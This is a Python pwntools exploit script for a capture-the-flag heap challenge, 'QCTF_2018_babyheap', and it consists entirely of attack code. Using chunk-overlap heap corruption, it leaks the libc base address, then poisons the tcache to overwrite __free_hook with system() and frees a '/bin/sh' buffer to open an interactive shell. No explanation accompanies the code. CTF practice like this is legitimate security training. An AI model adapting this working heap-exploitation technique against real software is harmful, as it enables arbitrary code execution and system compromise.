from pwn import *
#context.log_level = 'debug'
#r = remote('node3.buuoj.cn',25567)
r = process('./QCTF_2018_babyheap')
elf = ELF ('./QCTF_2018_babyheap')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

def create(size,data):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil('Size:')
	r.sendline(str(size))
	r.recvuntil('Data:')
	r.sendline(data)

def delete(index):
	r.recvuntil('Your choice :')
	r.sendline('2')
	r.recvuntil('Index')
	r.sendline(str(index))
def show():
	r.recvuntil('Your choice :')
	r.sendline('3')


create(0xf8,'')
create(0x648,'a'*0x5f0+p64(0x600))#1
create(0x500,'')
create(0x100,'')
delete(0)
delete(1)

create(0xf8,'b'*0xf8)
create(0x4f8,'')
create(0xf8,'')

delete(1)
delete(2)
create(0x4f8,'')
show()

r.recvuntil('4 : ')
libc_base = u64(r.recv(6)+'\x00'*2)-0x3ebca0
log.success(hex(libc_base))
create(0xf8,'')
delete(4)
delete(2)
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
create(0xf8,p64(free_hook))
create(0xf8,p64(free_hook))
create(0xf8,p64(system))
create(0xf8,'/bin/sh\x00')
delete(6)
r.interactive()